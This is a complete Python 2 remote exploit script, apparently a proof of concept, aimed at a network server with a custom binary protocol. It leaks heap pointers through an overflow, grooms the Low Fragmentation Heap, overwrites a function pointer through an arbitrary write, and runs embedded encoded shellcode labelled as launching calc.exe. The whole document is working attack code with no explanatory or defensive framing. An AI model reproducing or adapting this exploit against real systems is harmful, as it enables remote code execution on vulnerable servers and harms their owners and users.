import socket
import sys
import struct
import time
import os
import random
import binascii

#CALC.exe
#Payload size: 220 bytes
sc =  ""
sc += "\xbe\x26\xa1\xf7\xb8\xd9\xea\xd9\x74\x24\xf4\x58\x33"
sc += "\xc9\xb1\x31\x83\xe8\xfc\x31\x70\x0f\x03\x70\x29\x43"
sc += "\x02\x44\xdd\x01\xed\xb5\x1d\x66\x67\x50\x2c\xa6\x13"
sc += "\x10\x1e\x16\x57\x74\x92\xdd\x35\x6d\x21\x93\x91\x82"
sc += "\x82\x1e\xc4\xad\x13\x32\x34\xaf\x97\x49\x69\x0f\xa6"
sc += "\x81\x7c\x4e\xef\xfc\x8d\x02\xb8\x8b\x20\xb3\xcd\xc6"
sc += "\xf8\x38\x9d\xc7\x78\xdc\x55\xe9\xa9\x73\xee\xb0\x69"
sc += "\x75\x23\xc9\x23\x6d\x20\xf4\xfa\x06\x92\x82\xfc\xce"
sc += "\xeb\x6b\x52\x2f\xc4\x99\xaa\x77\xe2\x41\xd9\x81\x11"
sc += "\xff\xda\x55\x68\xdb\x6f\x4e\xca\xa8\xc8\xaa\xeb\x7d"
sc += "\x8e\x39\xe7\xca\xc4\x66\xeb\xcd\x09\x1d\x17\x45\xac"
sc += "\xf2\x9e\x1d\x8b\xd6\xfb\xc6\xb2\x4f\xa1\xa9\xcb\x90"
sc += "\x0a\x15\x6e\xda\xa6\x42\x03\x81\xac\x95\x91\xbf\x82"
sc += "\x96\xa9\xbf\xb2\xfe\x98\x34\x5d\x78\x25\x9f\x1a\x76"
sc += "\x6f\x82\x0a\x1f\x36\x56\x0f\x42\xc9\x8c\x53\x7b\x4a"
sc += "\x25\x2b\x78\x52\x4c\x2e\xc4\xd4\xbc\x42\x55\xb1\xc2"
sc += "\xf1\x56\x90\xa0\x94\xc4\x78\x09\x33\x6d\x1a\x55"
	
def send( type, pack_len, data=None):
	
	if pack_len < 6 or pack_len > 0x3d090:
		print "Length(Arg 2) must be between 6 and 0x3d090 bytes."
	
	#Set the type
	buf = struct.pack('>h', type)
	
	#Send length, must be less than 0x3d090, can be negative
	buf += struct.pack('>i', pack_len)
	
	#Send data
	if pack_len > 0:
		if data == None:
			data = os.urandom(pack_len-6)
		else:
			data_len = len(data)
			curr_size = data_len +6
			if curr_size < pack_len:
				data += os.urandom( pack_len - curr_size)
		buf += data
	try:
		#Send and receive
		csock.send(buf)
	except:
		pass

def send_receive(type, pack_len, data=None):
	
	ret_len = 0
	if pack_len < 6 or pack_len > 0x3d090:
		print "Length(Arg 2) must be between 6 and 0x3d090 bytes."
	
	#Set the type
	buf = struct.pack('>h', type)
	
	#Send length, must be less than 0x3d090, can be negative
	buf += struct.pack('>i', pack_len)
	
	#Send header
	csock.send(buf)
	
	#Send data
	try:
		if pack_len > 0:
			if data == None:
				data = os.urandom(pack_len-6)
				
			#Send and receive
			csock.send(data)
		#print "\nSent type: " + str(type) + " len: " + str(pack_len)
	except:
		print "\nTimed out: " + str(type) + " len: " + str(pack_len)
	
	ret_data = ''
	try:
		#ret_data += csock.recv( 0x6600 )
		while True:
			ret_data += csock.recv(1024)
										
	except:
		pass
		
	return ret_data	
	
def leak_mem( starting_size, overwrite_byte, max_len ):

	j = starting_size
	k = 7
	
	ret_data = ''
	while True:	

		#Data overflow type
		i = 256
			
		#send a packet and try to receive results
		data = ''
		data += "\x00"
		data += overwrite_byte * j
		data += "\x00"
		
		#send and receive
		ret_data = send_receive( i, len(data) + 6, data )
		ret_buf_len = len(ret_data)
		diff = max_len - ret_buf_len
		
		print "\nReceived %s Bytes: " % hex(ret_buf_len)
		if ret_buf_len > max_len:
			break
		elif diff < 0x26:
			j = 65
		elif diff < 0x100:
			j = 72
		else:
			j = (diff / 2) + 64
			
		time.sleep(0.2)
	
	return ret_data
	
	
def free_alloc_ptrs( ptr_offset ):
	
	#Free buffers
	free_number = ptr_offset

	#Free buffers
	i = 265

	#send a packet to zero out the target address
	data = struct.pack('>I', free_number)
	data += "\x00"
		
	ret_len = send_receive( i, len(data) + 6, data )	
	
def groom_heap( size ):

	#Data overflow type
	i = 84
		
	#send a packet and try to receive results
	data = ''
	#data += offset
	offset = random.randint(1, 2000000000)
	data += struct.pack('>I', offset)
	data += "A"* size
	data += "\x00"
		
	ret_len = send( i, len(data) + 6, data )
	time.sleep(0.2)
					
	#print "[+] Completed grooming the heap for " + str(num_packets) + " iterations. "
	
def alloc_free_single( index, alloc_flag, size ):

	if index < 0 or index > 100:	
		print "Please give an index > 0 and < 100.\n"

	#Try things
	i = 122

	data = struct.pack('>h', index )
	if alloc_flag:
		data += "A"* size		
		#print "[+] Allocated buffer for index " + str(index)
	#else:
		#print "[+] Freed buffer at index " + str(index)
		
	data += "\x00"
	
	send_receive( i, len(data) + 6, data)
	
def trigger_heap_overflow( len_str ):

	#Data overflow type
	i = 27
		
	#send a packet and try to receive results
	data = ''
	if len_str > 0:
		data += "\x90" * len_str
		data += sc
	data += "\x00"
		
	ret_len = send_receive( i, len(data) + 6, data )
	
	
if len (sys.argv) == 3:
    (progname, host, port) = sys.argv
else:
    print len (sys.argv)
    print 'Usage: {0} host port'.format (sys.argv[0])
    exit (1)

csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )
csock.settimeout(0.5)

print "[+] Connected to server."

#Free buffers
print "[+] Reallocating initial heap buffers for exploit."
free_number = 0xFF439EB2
free_alloc_ptrs( free_number )

#Alloc buffers
alloc_number = 0xf5000
free_alloc_ptrs( alloc_number )

# Release heap address
print "[+] Freeing heap buffer for heap overflow."
trigger_heap_overflow(0)

print "[+] Overflowing data section to leak heap pointers."
#Send initial packet, crashes sometimes without it
#Data overflow type
i = 256
		
#send a packet and try to receive results
data = ''
data += "\x00"
data += "\x01" * 64
data += "\x00"
	
ret_data = send_receive( i, len(data) + 6, data )

# offset to addr + header
offset_to_addr = 0x65e0 + 6
offset_to_addr2 = 0x3aa8 + 6

# Fill the data section with 0x1s
ret_data = leak_mem( 0x3a00, "\x01", offset_to_addr )

# Get the data so we can parse it
ret_data = leak_mem( 65, "\x04", offset_to_addr + 2 )
ret_buf_len = len(ret_data)		
	
#print out
off_addr_arr = ret_data[offset_to_addr:offset_to_addr+4]
off_addr_arr2 = ret_data[offset_to_addr2:offset_to_addr2+4]

if len(off_addr_arr) == 4: 
	off_addr = struct.unpack("i", off_addr_arr)[0]
else:
	off_addr = 0x0
	
print "Arb write address: " + hex(off_addr)

off_addr2 = struct.unpack("i", off_addr_arr2)[0]
print "Dependent address: " +hex(off_addr2)

# Activate low frag heap
print "[+] Activating Low Fragmentaion Heap for second size and skipping first bucket."
for i in range( 0, 0x70):
	groom_heap( 0xff )
	
#Reserve spot for later
alloc_free_single( 12, True, 0xff )	
alloc_free_single( 13, True, 0xff )	

for i in range( 0, 0x30):
	groom_heap( 0xff )

#Free one
alloc_free_single( 13, False, 0xff )	

# Func Ptr
func_ptr_addr = 0x04E9128
offset = (func_ptr_addr - off_addr)/4
#print "Offset: " + binascii.hexlify( struct.pack('>i', int(offset)) )

# Arbitrary write
print "[+] Triggering function pointer overwrite with heap pointer."
i = 70
offset2 = 0xf5000
	
#send a packet and try to receive results
data = ''
data += struct.pack('>i', int(offset))
data += struct.pack('>i', offset2)
data += "\x01" * 0xffa9
data += "\x00"*16
		
ret_len = send_receive( i, len(data) + 6, data )
time.sleep( 2 )

#Reserve spot for later
alloc_free_single( 12, False, 0xff )	

# Arbitrary write
print "[+] Overflowing heap allocation with shellcode."

func_ptr_addr = 0x04E9348
offset = (func_ptr_addr - off_addr)/4
i = 70
offset2 = 0xf5000
	
#send a packet and try to receive results
data = ''
data += struct.pack('>i', int(offset))
data += struct.pack('>i', offset2)

buf = "\x90" * 0x500
buf += sc

data += buf
data += "\x01" * ( 0xffa9 - len(buf) )
data += "\x00"*16
		
ret_len = send_receive( i, len(data) + 6, data )
time.sleep( 2 )

# Call function pointer
print "[+] Calling overwritten function pointer."
i = 12

data = struct.pack('>i', 100)
send_receive( i, len(data) + 6, data)

time.sleep( 10 )

csock.close()	